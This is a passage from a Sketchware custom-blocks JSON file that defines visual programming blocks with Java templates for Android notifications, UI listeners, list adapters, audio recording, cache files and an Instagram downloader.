context.getSystemService(Context.NOTIFICATION_SERVICE);\n\t\t\tIntent intent335 \u003d new Intent();\n\t\t\t\t\t\t\t\t\t   public void create(){\n\n\t\t\t\t\t\t\t\t\t\t   intent335.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP); \n\t\t\t\t\t\t\t\t\t\t   PendingIntent pendingIntent \u003d PendingIntent.getActivity(activity, 0, intent335, 0);\n\t\t\t\t\t\t\t\t\t\t   \n\t\t\t\t\t\t\t\t\t\t   if (android.os.Build.VERSION.SDK_INT \u003e\u003d android.os.Build.VERSION_CODES.O) {\n\t\t\t\t\t\t\t\t\t\t\t   NotificationChannel mChannel \u003d new NotificationChannel(\n\t\t\t\t\t\t\t\t\t\t\t\t   channelId, channelName, NotificationManager.IMPORTANCE_HIGH);\n\t\t\t\t\t\t\t\t\t\t\t   notificationManager.createNotificationChannel(mChannel);\n\t\t\t\t\t\t\t\t\t\t   }\n\t\t\t\t\t\t\t\t\t\n\n%5$s\n\n\t\t\t\t\t\t\t\t\t   }\n\n\t\t\t\t\t\t\t\t   }.create();}\n\t\t","color":"#FF00C853","name":"create push notification","typeName":"","palette":"154","type":"c","spec":"create new notification in %m.activity with with notification ID %d channel ID %d with name %m.notification"},{"code":"setSmallIcon(R.drawable.%s);","color":"#FF00C853","name":"set small icon","typeName":"","palette":"154","type":" ","spec":"set small icon %m.resource"},{"code":"setContentTitle(%s);","color":"#FF00C853","name":"set title","typeName":"","palette":"154","type":" ","spec":" set title %s"},{"code":"setContentText(%s);","color":"#FF00C853","name":"set content text","typeName":"","palette":"154","type":" ","spec":"set content text %s"},{"code":"\t\t\t\t\t\t\t\t\t\t   setAutoCancel(%s);","color":"#FF00C853","name":"auto cancel","typeName":"","palette":"154","type":" ","spec":" set auto cancel %b"},{"code":"setOngoing(%s);","color":"#FF00C853","name":"on going ","typeName":"","palette":"154","type":" ","spec":"set on going %b"},{"code":"setColor(%s);","color":"#FF00C853","name":"set color ","typeName":"","palette":"154","type":" ","spec":"set color %m.color"},{"code":"setTitleColor(%s);","color":"#FF00C853","name":"set title color","typeName":"","palette":"154","type":" ","spec":"set title color %m.color"},{"code":"setSound(android.net.Uri.parse(%s));","color":"#FF00C853","name":"sound uri","typeName":"","palette":"154","type":" ","spec":"set sound uri %s"},{"code":"setPriority(androidx.core.app.NotificationCompat.PRIORITY_DEFAULT);","color":"#FF00C853","name":"set priority default","typeName":"","palette":"154","type":" ","spec":"set priority default"},{"code":"setLights(%s,%s,%s);","color":"#FF00C853","name":"light","typeName":"","palette":"154","type":" ","spec":"set Lights color %m.color start ms %d stop ms %d"},{"code":"setContentView(R.layout.%s);","color":"#FF00C853","name":"set content view","typeName":"","palette":"154","type":" ","spec":"set content view %m.customViews"},{"code":"%s \u003d findViewById(R.id.%s);","color":"#FF00C853","name":"view","typeName":"","palette":"154","type":" ","spec":"%s.inputOnly find view byId %s.inputOnly"},{"code":"RemoteViews contentView \u003d new RemoteViews(getPackageName(), R.layout.%s);\nsetContent(contentView);","color":"#FF00C853","name":"set content view remote","typeName":"","palette":"154","type":" ","spec":"set content remote view %m.customViews"},{"code":"contentView.setOnClickPendingIntent(R.id.%2$s,pendingIntent%1$s);","color":"#FF00C853","name":"on click","typeName":"pandingIntent","palette":"154","type":" ","spec":"pandingIntent %s.inputOnly FVB id %s.inputOnly set on click "},{"code":"%1$s.putExtra(%2$s,%3$s);","color":"#FF00C853","name":"intent","typeName":"intent","palette":"154","type":" ","spec":"%m.intent put extra key %s value %s"},{"code":"%1$s.setClass(getApplicationContext(),%2$s.class);\r\n","color":"#FF00C853","name":"set screen","typeName":"intent","palette":"154","type":" ","spec":"%m.intent set screen %m.activity"},{"code":"setContentIntent(pendingIntent);\t\t\t\t\t\t\t\t   setContentIntent(TaskStackBuilder.create(context)\n\t\t\t\t\t\t\t\t\t\t   .addNextIntent(intent335).getPendingIntent(0,PendingIntent.FLAG_UPDATE_CURRENT));\n\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t","color":"#FF00C853","name":"set intent","typeName":"","palette":"154","type":" ","spec":"set default panding intent"},{"code":"Intent %1$s \u003d new Intent(%2$s.this, %3$s.class);\nPendingIntent pendingIntent%1$s \u003d PendingIntent.getActivity(%2$s.this, 0, %1$s, 0);\n%1$s.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | %1$s.FLAG_ACTIVITY_CLEAR_TASK);","color":"#FF00C853","name":"create intent","typeName":"","palette":"154","type":" ","spec":"create %m.pandingIntent this %m.activity go to %m.activity"},{"code":"%s","color":"#FF00C853","name":"custom panding intent","typeName":"pandingIntent","palette":"154","type":"p","spec":"panding intent %s.inputOnly"},{"code":"intent335","color":"#FF00C853","name":"panding intent","typeName":"pandingIntent","palette":"154","type":"p","spec":"default panding intent"},{"code":"notificationManager.notify(notificationId, this.build());","color":"#FF00C853","name":"notification show","typeName":"","palette":"154","type":"f","spec":"notification show"},{"code":"","color":"#FF8E24AA","name":"created by arab ware channel !","typeName":"","palette":"155","type":"h","spec":"created by arab ware channel !"},{"code":"%1$s \u003d \"1\";\r\n%2$s.setOnClickListener(new View.OnClickListener() {\n\t@Override\n\tpublic void onClick(View _view) {\n\t\tif (%1$s.equals(\"1\")) {\r\n\t\t\t%3$s\n\t\t\t%1$s \u003d \"0\";\r\n\t\t}\r\n\t\telse {\r\n\t%4$s\n\t\t\t%1$s \u003d \"1\";\r\n\t\t}\n\t}\n});","color":"#FF8E24AA","typeName":"","name":"when blocks","palette":"155","type":"e","spec":"By using %m.varStr when %m.view touched ! then","spec2":"when touched again !"},{"code":"%1$s.setOnTouchListener(new View.OnTouchListener(){\n@Override\npublic boolean onTouch(View v, MotionEvent event){\nint ev \u003d event.getAction();\nswitch (ev) {\ncase MotionEvent.ACTION_DOWN:\n\n%2$s\n\nbreak;\ncase MotionEvent.ACTION_UP:\n\n%3$s\n\nbreak;\n} return true;\n}\n});","color":"#FF8E24AA","typeName":"","name":"when touch","palette":"155","type":"e","spec":"when %m.view touched","spec2":"when finger released"},{"code":"%1$s.setOnClickListener(new View.OnClickListener(){\n@Override\npublic void onClick(View _view){\n%2$s\n}\n});","color":"#FF8E24AA","name":"setOnClickListener","typeName":"","palette":"155","type":"c","spec":"When %m.view On Clicked"},{"code":"%1$s.setOnLongClickListener(new View.OnLongClickListener(){\n@Override\npublic boolean onLongClick(View _view){\n%2$s\nreturn false;\n}\n});","color":"#FF8E24AA","name":"setOnLongClickListener","typeName":"","palette":"155","type":"c","spec":"When %m.view On Long Clicked"},{"code":"%2$s.setOnScrollChangeListener(new View.OnScrollChangeListener(){\n@Override\npublic void onScrollChange(View _view, int _x, int _y, int _oldX, int _oldY){\n%2$s\n}\n});","color":"#FF8E24AA","name":"setOnScrollChanged","typeName":"","palette":"155","type":"c","spec":"When %m.view On Scroll Changed"},{"code":"%1$s.addTextChangedListener(new TextWatcher() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onTextChanged(CharSequence _param1, int _param2, int _param3, int _param4) {\r\n\t\t\t\tfinal String %1$snn \u003d _param1.toString();\r\n\t\t\t\t\r%2$s\n\t\t\t}\r\n\t\t\t\r\n\t\t\t@Override\r\n\t\t\tpublic void beforeTextChanged(CharSequence _param1, int _param2, int _param3, int _param4) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t@Override\r\n\t\t\tpublic void afterTextChanged(Editable _param1) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t});","color":"#FF8E24AA","name":"OnTextChange","typeName":"","palette":"155","type":"c","spec":"%m.edittext on text changed"},{"code":"%1$snn","color":"#FF8E24AA","name":"get changed text","typeName":"","palette":"155","type":"s","spec":"get changed text of %m.edittext"},{"code":"%1$s.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onProgressChanged (SeekBar _param1, int _param2, boolean _param3) {\r\n\t\t\t\tfinal int %1$snnb \u003d _param2;\r\n\t\t\t\t\r%2$s\n\t\t\t}\r\n\t\t\t\r\n\t\t\t@Override\r\n\t\t\tpublic void onStartTrackingTouch(SeekBar _param1) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t@Override\r\n\t\t\tpublic void onStopTrackingTouch(SeekBar _param2) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t});","color":"#FF8E24AA","name":"OnSeekBarProgressChanged","typeName":"","palette":"155","type":"c","spec":"%m.seekbar on progress changed"},{"code":"%1$snnb","color":"#FF8E24AA","name":"get progress","typeName":"","palette":"155","type":"d","spec":"%m.seekbar get progress"},{"code":"%1$s.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onItemSelected(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\t\t\tfinal int %1$snnbb \u003d _param3;\r\n\t\t\t\t\r%2$s\n\t\t\t}\r\n\t\t\t\r\n\t\t\t@Override\r\n\t\t\tpublic void onNothingSelected(AdapterView\u003c?\u003e _param1) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t});","color":"#FF8E24AA","name":"OnspinnerItemClicked","typeName":"","palette":"155","type":"c","spec":"%m.spinner on item clicked"},{"code":"%1$snnbb","color":"#FF8E24AA","name":"spinner get postion","typeName":"","palette":"155","type":"d","spec":"%m.spinner get postion"},{"code":"%1$s.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onCheckedChanged(CompoundButton _param1, boolean _param2)  {\r\n\t\t\t\tfinal boolean %1$snnbbm \u003d _param2;\r\n\t\t\t\t\r%2$s\n\t\t\t}\r\n\t\t});\r","color":"#FF8E24AA","name":"SwitchOnCheckChanged","typeName":"","palette":"155","type":"c","spec":"%m.switch On Check Changed"},{"code":"%1$snnbbm","color":"#FF8E24AA","name":"get check","typeName":"","palette":"155","type":"b","spec":"%m.switch get check"},{"code":"%1$s.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic void onCheckedChanged(CompoundButton _param1, boolean _param2)  {\r\n\t\t\t\tfinal boolean %1$snnbbmm \u003d _param2;\r\n\t\t\t\t\r%2$s\n\t\t\t}\r\n\t\t});\r","color":"#FF8E24AA","name":"CheckBoxOnCheckChanged","typeName":"","palette":"155","type":"c","spec":"%m.checkbox on check changed"},{"code":"%1$snnbbmm","color":"#FF8E24AA","name":"get check 2","typeName":"","palette":"155","type":"b","spec":"%m.checkbox get check"},{"code":"%1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic void onItemClick(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\t\t\t\t\tfinal int %1$sP \u003d _param3;\n\t\t\t\t\t\t\r%2$s\n\t\t\t\t}\r\n\t\t});\r","color":"#FF8E24AA","name":"ListViewOnItemClicked","typeName":"","palette":"155","type":"c","spec":"%m.listview on item clicked"},{"code":"%1$s.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic boolean onItemLongClick(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\t\t\tfinal int %1$sP \u003d _param3;\r\n\t\t\t\t\r%2$s\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t});","color":"#FF8E24AA","name":"ListViewOnItemLongClick","typeName":"","palette":"155","type":"c","spec":"%m.listview on item long click"},{"code":"%1$sP","color":"#FF8E24AA","name":"get item position","typeName":"","palette":"155","type":"d","spec":"%m.listview get item position"},{"code":"%1$s.setOnScrollListener(new AbsListView.OnScrollListener() {\n\t\t\t@Override\n\t\t\tpublic void onScrollStateChanged(AbsListView abs, int _scrollState) {\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t@Override\n\t\t\tpublic void onScroll(AbsListView abs, int %1$sF, int %1$sV, int %1$sT) {\n\t\t\t\t%2$s\n\t\t\t}\n\t\t});\r","color":"#FF8E24AA","name":"ListViewOnScroll","typeName":"","palette":"155","type":"c","spec":"%m.listview on scroll"},{"code":"%1$sF","color":"#FF8E24AA","name":"get first seen item","typeName":"","palette":"155","type":"d","spec":"%m.listview get first seen item"},{"code":"%1$sV","color":"#FF8E24AA","name":"get visible items count","typeName":"","palette":"155","type":"d","spec":"%m.listview get visible items count"},{"code":"%1$sT","color":"#FF8E24AA","name":"get total items count","typeName":"","palette":"155","type":"d","spec":"%m.listview get total items count"},{"code":"}\n\tpublic class %1$sAdapter extends BaseAdapter {\r\n\t\tArrayList\u003cHashMap\u003cString, Object\u003e\u003e _data;\r\n\t\tpublic %1$sAdapter(ArrayList\u003cHashMap\u003cString, Object\u003e\u003e _arr) {\r\n\t\t\t_data \u003d _arr;\r\n\t\t}\r\n\t\t\r\n\t\t@Override\r\n\t\tpublic int getCount() {\r\n\t\t\treturn _data.size();\r\n\t\t}\r\n\t\t\r\n\t\t@Override\r\n\t\tpublic HashMap\u003cString, Object\u003e getItem(int _index) {\r\n\t\t\treturn _data.get(_index);\r\n\t\t}\r\n\t\t\r\n\t\t@Override\r\n\t\tpublic long getItemId(int _index) {\r\n\t\t\treturn _index;\r\n\t\t}\r\n\t\t@Override\r\n\t\tpublic View getView(final int _position, View _v, ViewGroup _container) {\r\n\t\t\tLayoutInflater _inflater \u003d (LayoutInflater)getBaseContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);\r\n\t\t\tView _view \u003d _v;\r\n\t\t\tif (_view \u003d\u003d null) {\r\n\t\t\t\t_view \u003d _inflater.inflate(R.layout.%2$s, null);\r\n\t\t\t}\r\n\t%3$s\n\t\t\t\r\n\t\t\treturn _view;\r\n\t\t}","color":"#FF8E24AA","name":"ListViewOnBindCustom","typeName":"","palette":"155","type":"c","spec":"OnBindCustom with adapter %s.inputOnly with %m.customViews"},{"code":"/*%1$s*/\nfinal %2$s %3$s \u003d (%2$s) _view.findViewById(R.id.%3$s);","color":"#FF8E24AA","name":"add view for custom bind","typeName":"","palette":"155","type":" ","spec":"%m.listview add view with type %m.typeview with id %s.inputOnly"},{"code":"/*%1$s*/_position","color":"#FF8E24AA","name":"get P","typeName":"","palette":"155","type":"d","spec":"%m.listview get position"},{"code":"%1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {\r\n\t\t\t\t@Override\r\n\t\t\t\tpublic void onItemClick(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\t\t\t\t\tfinal int %1$sP \u003d _param3;\n\t\t\t\t\t\t\r%2$s\n\t\t\t\t}\r\n\t\t});\r","color":"#FF8E24AA","name":"GridViewOnItemClicked","typeName":"","palette":"155","type":"c","spec":"%m.gridview on item clicked"},{"code":"%1$s.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {\r\n\t\t\t@Override\r\n\t\t\tpublic boolean onItemLongClick(AdapterView\u003c?\u003e _param1, View _param2, int _param3, long _param4) {\r\n\t\t\t\tfinal int %1$sP \u003d _param3;\r\n\t\t\t\t\r%2$s\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t});\r","color":"#FF8E24AA","name":"GridViewOnItemLongClick","typeName":"","palette":"155","type":"c","spec":"%m.gridview on item long click"},{"code":"%1$sP","color":"#FF8E24AA","name":"get item position2","typeName":"","palette":"155","type":"d","spec":"%m.gridview get item position"},{"code":"}\n\tpublic class %1$sAdapter extends BaseAdapter {\r\n\t\tArrayList\u003cHashMap\u003cString, Object\u003e\u003e _data;\r\n\t\tpublic %1$sAdapter(ArrayList\u003cHashMap\u003cString, Object\u003e\u003e _arr) {\r\n\t\t\t_data \u003d _arr;\r\n\t\t}\r\n\t\t\r\n\t\t@Override\r\n\t\tpublic int getCount() {\r\n\t\t\treturn _data.size();\r\n\t\t}\r\n\t\t\r\n\t\t@Override\r\n\t\tpublic HashMap\u003cString, Object\u003e getItem(int _index) {\r\n\t\t\treturn _data.get(_index);\r\n\t\t}\r\n\t\t\r\n\t\t@Override\r\n\t\tpublic long getItemId(int _index) {\r\n\t\t\treturn _index;\r\n\t\t}\r\n\t\t@Override\r\n\t\tpublic View getView(final int _position, View _v, ViewGroup _container) {\r\n\t\t\tLayoutInflater _inflater \u003d (LayoutInflater)getBaseContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);\r\n\t\t\tView _view \u003d _v;\r\n\t\t\tif (_view \u003d\u003d null) {\r\n\t\t\t\t_view \u003d _inflater.inflate(R.layout.%2$s, null);\r\n\t\t\t}\r\n\t%3$s\n\t\t\t\r\n\t\t\treturn _view;\r\n\t\t}","color":"#FF8E24AA","name":"GridViewOnBindCustom","typeName":"","palette":"155","type":"c","spec":"OnBindCustom with adapter %s.inputOnly with %m.customViews"},{"code":"/*%1$s*/\nfinal %2$s %3$s \u003d (%2$s) _view.findViewById(R.id.%3$s);","color":"#FF8E24AA","name":"add view for custom bind2","typeName":"","palette":"155","type":" ","spec":"%m.gridview add view with type %m.typeview with id %s.inputOnly"},{"code":"/*%1$s*/_position","color":"#FF8E24AA","name":"get P2","typeName":"","palette":"155","type":"d","spec":"%m.gridview get position"},{"code":"","color":"#FF388E3C","name":"created by gerges","typeName":"","palette":"156","type":"h","spec":"created by Gerges Shamon"},{"code":"}\npublic String readFileBase64(String path){\r\nString filePath \u003d path;\r\nString outData \u003d \"\";\r\n   \r\n    java.io.File file \u003d new java.io.File(filePath);\r\n    try (java.io.FileInputStream InFile \u003d new java.io.FileInputStream(file)) {\r\n    // Reading a file from file system\r\n    byte fileData[] \u003d new byte[(int) file.length()];\r\n    InFile.read(fileData);\r\n    byte[] encodedBytesFile \u003d org.apache.commons.codec.binary.Base64.encodeBase64(fileData);\r\n    \r\n    outData \u003d new String(encodedBytesFile);\r\n    } catch (java.io.FileNotFoundException e) {\r\n SketchwareUtil.showMessage(getApplicationContext(), \"File not found\" + e);\r\n    } catch (java.io.IOException ioe) {\r\nSketchwareUtil.showMessage(getApplicationContext(),\"Exception while reading the File \" + ioe);\r\n    }\r\n    return outData;\r\n}\npublic void haha_lol () {","color":"#FF388E3C","name":"put me at more block kindly","typeName":"","palette":"156","type":" ","spec":"put me at more block kindly"},{"code":"readFileBase64(%1$s)","color":"#FF388E3C","name":"read a file","typeName":"","palette":"156","type":"s","spec":"read a file with path %s"},{"code":"","color":"#FF689F38","name":"created by arab ware ","typeName":"","palette":"157","type":"h","spec":"created by arab ware channel"},{"code":"%1$s \u003d new MediaRecorder();","color":"#FF689F38","name":"create.....","typeName":"","palette":"157","type":" ","spec":"%m.AudioRecorder create"},{"code":"%1$s.setAudioSource(MediaRecorder.AudioSource.MIC);\n%1$s.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);\n%1$s.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);\n%1$s.setOutputFile(%2$s);","color":"#FF689F38","name":"set file path","typeName":"","palette":"157","type":" ","spec":"%m.AudioRecorder set file path %s"},{"code":"try {\n%1$s.prepare();\n%1$s.start();\n} catch (Exception e) {}\r","color":"#FF689F38","name":"start record audio","typeName":"","palette":"157","type":" ","spec":"%m.AudioRecorder start"},{"code":"try {\n%1$s.stop();\n%1$s.release();\n%1$s \u003d null;\n} catch(Exception e) {}","color":"#FF689F38","name":"stop recording audio","typeName":"","palette":"157","type":" ","spec":"%m.AudioRecorder stop"},{"code":"","color":"#FF689F38","name":"put this below","typeName":"","palette":"157","type":"h","spec":"put this below at more block"},{"code":"}\nprivate void fo4o() {","color":"#FF689F38","name":"More Block Audio","typeName":"","palette":"157","type":" ","spec":"private void fo4o ( must be in more block )"},{"code":"}\nprivate void fo4o() {","color":"#FF689F38","name":"More Block Audio","typeName":"","palette":"157","type":" ","spec":"private void fo4o ( must be in more block )"},{"code":"","color":"#FF388E3C","name":"created by arab ware team !","typeName":"","palette":"157","type":"h","spec":"created by arab ware channel"},{"code":"%1$s","color":"#FF388E3C","name":"AudioManager","typeName":"AudioManager","palette":"157","type":"v","spec":"AudioManager %s.inputOnly"},{"code":"%1$s \u003d (AudioManager) getSystemService(Context.AUDIO_SERVICE);","color":"#FF388E3C","name":"Add AudioManager","typeName":"","palette":"157","type":" ","spec":"AudioManager %m.AudioManager |OnCreate|"},{"code":"%1$s.setStreamVolume(AudioManager.STREAM_MUSIC, %2$s, 0);\nchanged();","color":"#FF388E3C","name":"change","typeName":"","palette":"157","type":" ","spec":"%m.AudioManager change volume %d"},{"code":"%1$s.getStreamMaxVolume(AudioManager.STREAM_MUSIC)","color":"#FF388E3C","name":"get max volume","typeName":"","palette":"157","type":"d","spec":"%m.AudioManager get max volume"},{"code":"","color":"#FF2E7D32","name":"created......","typeName":"","palette":"158","type":"h","spec":"created by arab ware channel."},{"code":"}\nprivate int count;\nprivate java.io.File cacheFile;\nprivate java.io.InputStream input;\nprivate java.io.OutputStream output;\nprivate byte[] data;\nprivate java.io.FileWriter fileWriter;\n\npublic String readCacheFile (java.io.File file) {\nfinal StringBuilder sb \u003d new StringBuilder();\n\t\tjava.io.FileReader fr \u003d null;\n\t\ttry {\n\t\t\tfr \u003d new java.io.FileReader(file);\n\n\t\t\tchar[] buff \u003d new char[1024];\n\t\t\tint length \u003d 0;\n\n\t\t\twhile ((length \u003d fr.read(buff)) \u003e 0) {\n\t\t\t\tsb.append(new String(buff, 0, length));\n\t\t\t}\n\t\t} catch (java.io.IOException e) {\n\t\t} finally {\n\t\t\tif (fr !\u003d null) {\n\t\t\t\ttry {\n\t\t\t\t\tfr.close();\n\t\t\t\t} catch (Exception e) {\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\treturn sb.toString();\n}\n\n{","color":"#FF2E7D32","name":"library.........","typeName":"","palette":"158","type":" ","spec":"library | put me at more block | المكتبة | ضعني في مور بلوك"},{"code":"try{\ncacheFile \u003d new java.io.File(%3$s.this.getCacheDir(),%1$s);\ninput\u003d %3$s.this.getAssets().open(%2$s);\noutput \u003d new  java.io.FileOutputStream(cacheFile);\ndata \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n\n\t}catch(Exception e){\n\t\t\r\n\t}","color":"#FF2E7D32","name":"create new cache file from asset","typeName":"","palette":"158","type":" ","spec":"create new cache file with name %s from asset %s in %m.activity"},{"code":"try{\ncacheFile \u003d new java.io.File(%3$s.this.getActivity().getCacheDir(),%1$s);\ninput\u003d %3$s.this.getActivity().getAssets().open(%2$s);\noutput \u003d new  java.io.FileOutputStream(cacheFile);\ndata \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n\n\t}catch(Exception e){\n\t\t\r\n\t}","color":"#FF2E7D32","name":"create new cache file from asset_copy93","typeName":"","palette":"158","type":" ","spec":"create new cache file with name %s from asset %s in fragment %m.activity"},{"code":"try{\ncacheFile \u003d new java.io.File(%4$s.this.getCacheDir(),%1$s);\ninput\u003d new java.io.FileInputStream(new java.io.File(%2$s));\noutput \u003d new  java.io.FileOutputStream(cacheFile);\ndata \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n\n\t}catch(Exception e){\n\t\t\r\n\t}","color":"#FF2E7D32","name":"create cache file from path","typeName":"","palette":"158","type":" ","spec":"create cache file with name %s from storage file path %s in %m.activity"},{"code":"try{\ncacheFile \u003d new java.io.File(%4$s.this.getActivity().getCacheDir(),%1$s);\ninput\u003d new java.io.FileInputStream(new java.io.File(%2$s));\noutput \u003d new  java.io.FileOutputStream(cacheFile);\ndata \u003d new byte[1024];\nwhile ((count \u003d input.read(data))\u003e0) {\noutput.write(data, 0, count);\n}\noutput.flush();\noutput.close();\ninput.close();\n\n\t}catch(Exception e){\n\t\t\r\n\t}","color":"#FF2E7D32","name":"create cache file from path_copy89","typeName":"","palette":"158","type":" ","spec":"create cache file with name %s from storage file path %s in fragment %m.activity"},{"code":"cacheFile \u003d new java.io.File(%3$s.this.getCacheDir(),%1$s);\nfileWriter \u003d null;\n\n\t\ttry {\n\t\t\tfileWriter \u003d new java.io.FileWriter(cacheFile, false);\n\t\t\tfileWriter.write(%2$s);\n\t\t\tfileWriter.flush();\n\t\t} catch (java.io.IOException e) {\n\t\n\t\t} finally {\n\t\t\ttry {\n\t\t\t\tif (fileWriter !\u003d null)\n\t\t\t\t\tfileWriter.close();\n\t\t\t} catch (java.io.IOException e) {\n\t\n\t\t\t}\n\t\t}","color":"#FF2E7D32","name":"create cache file from string","typeName":"","palette":"158","type":" ","spec":"create cache file with name %s from string %s in %m.activity"},{"code":"cacheFile \u003d new java.io.File(%3$s.this.getActivity().getCacheDir(),%1$s);\nfileWriter \u003d null;\n\n\t\ttry {\n\t\t\tfileWriter \u003d new java.io.FileWriter(cacheFile, false);\n\t\t\tfileWriter.write(%2$s);\n\t\t\tfileWriter.flush();\n\t\t} catch (java.io.IOException e) {\n\t\n\t\t} finally {\n\t\t\ttry {\n\t\t\t\tif (fileWriter !\u003d null)\n\t\t\t\t\tfileWriter.close();\n\t\t\t} catch (java.io.IOException e) {\n\t\n\t\t\t}\n\t\t}","color":"#FF2E7D32","name":"create cache file from string_copy55","typeName":"","palette":"158","type":" ","spec":"create cache file with name %s from string %s in fragment %m.activity"},{"code":"new java.io.File(%2$s.this.getCacheDir(),%1$s).getAbsolutePath()","color":"#FF2E7D32","name":"getCacheFilePath","typeName":"","palette":"158","type":"s","spec":"get cache file %s real path in %m.activity"},{"code":"new java.io.File(%2$s.this.getActivity().getCacheDir(),%1$s).getAbsolutePath()","color":"#FF2E7D32","name":"getCacheFilePath_copy19","typeName":"","palette":"158","type":"s","spec":"get cache file %s real path in fragment %m.activity"},{"code":"readCacheFile(new java.io.File(%1$s.this.getCacheDir(),%2$s))","color":"#FF2E7D32","name":"getCacheFileString","typeName":"","palette":"158","type":"s","spec":"%m.activity get cache file %s as string"},{"code":"readCacheFile(new java.io.File(%1$s.this.getActivity().getCacheDir(),%2$s))","color":"#FF2E7D32","name":"getCacheFileString_copy93","typeName":"","palette":"158","type":"s","spec":"%m.activity fragment get cache file %s as string"},{"code":"new java.io.File(%2$s.this.getCacheDir(),%1$s).delete();","color":"#FF2E7D32","name":"delete...","typeName":"","palette":"158","type":" ","spec":"delete cache file name %s in %m.activity"},{"code":"new java.io.File(%2$s.this.getActivity().getCacheDir(),%1$s).delete();","color":"#FF2E7D32","name":"delete..._copy43","typeName":"","palette":"158","type":" ","spec":"delete cache file name %s in fragment %m.activity"},{"code":"","color":"#FF000000","name":"created by arab ware channel....","typeName":"","palette":"159","type":"h","spec":"created by arab ware channel"},{"code":"%1$s.setOnClickListener(new View.OnClickListener(){\n@Override\npublic void onClick(View _clickedView){\n%2$s\n}\n});","color":"#FF000000","name":"onClickListener","typeName":"","palette":"159","type":"c","spec":"%m.view setOnClickListener \u003d\u003d\u003d\u003e onClick(View _clickedView) "},{"code":"%1$s.setOnClickListener(null);","color":"#FF000000","name":"remove onClickListener","typeName":"","palette":"159","type":" ","spec":"%m.view remove onClickListener"},{"code":"%1$s.setOnTouchListener(new View.OnTouchListener(){\n@Override\npublic boolean onTouch(View _touchedView , MotionEvent event){\nint ev \u003d event.getAction();\nswitch (ev) {\ncase MotionEvent.ACTION_DOWN:\n\n%2$s\n\nbreak;\ncase MotionEvent.ACTION_UP:\n\n%3$s\n\nbreak;\n} return true;\n}\n});","color":"#FF000000","typeName":"","name":"onTouchListener","palette":"159","type":"e","spec":"%m.view setOnTouchListener \u003d\u003d\u003d\u003e onTouch(View _touchedView , MotionEvent event)","spec2":"onNotTouched"},{"code":"%1$s.setOnTouchListener(null);","color":"#FF000000","name":"remove onTouchListener","typeName":"","palette":"159","type":" ","spec":"%m.view remove onTouchListener"},{"code":"%1$s.setOnLongClickListener(new View.OnLongClickListener(){\n@Override\npublic boolean onLongClick(View _longClickedView){\n%2$s\nreturn false;\n}\n});","color":"#FF000000","name":"onLongClicked","typeName":"","palette":"159","type":"c","spec":"%m.view setOnLongClickListener \u003d\u003d\u003d\u003e onLongClick(View _longClickedView)"},{"code":"%1$s.setOnLongClickListener(null);","color":"#FF000000","name":"remove onLongClickListener","typeName":"","palette":"159","type":" ","spec":"%m.view remove onLongClickListener"},{"code":"","color":"#FFE53935","name":"Created By Arab Ware Channel !","typeName":"","palette":"160","type":"h","spec":"created by arab ware channel"},{"code":"","color":"#FFE53935","name":"Put All these Blocks Into OnTryToDownloadEvent","typeName":"","palette":"160","type":"h","spec":"Put All these Blocks Into OnTryToDownloadEvent"},{"code":"_Connected();\n_NotConnected();","color":"#FFE53935","name":"CheckInternet","typeName":"","palette":"160","type":" ","spec":"Check Internet !"},{"code":"String %1$sUrl \u003d InstaLoad;\nandroid.net.ConnectivityManager %1$sMA \u003d (android.net.ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);\nandroid.net.NetworkInfo %1$sNI \u003d %1$sMA.getActiveNetworkInfo();\nif (%1$sNI !\u003d null \u0026\u0026 %1$sNI.isConnected()) {\n_Connected();\n} else {\n\t\t\t_NotConnected();\n}\nfinal DownloadManager.Request %1$sRQ \u003d new DownloadManager.Request(Uri.parse(%1$sUrl));","color":"#FFE53935","name":"Set Url","typeName":"","palette":"160","type":" ","spec":"%m.InstagramDownloader Get Url From RequestNetwork"},{"code":"String %1$sFN \u003d %2$s;","color":"#FFE53935","name":"set file name","typeName":"","palette":"160","type":" ","spec":"%m.InstagramDownloader set file name 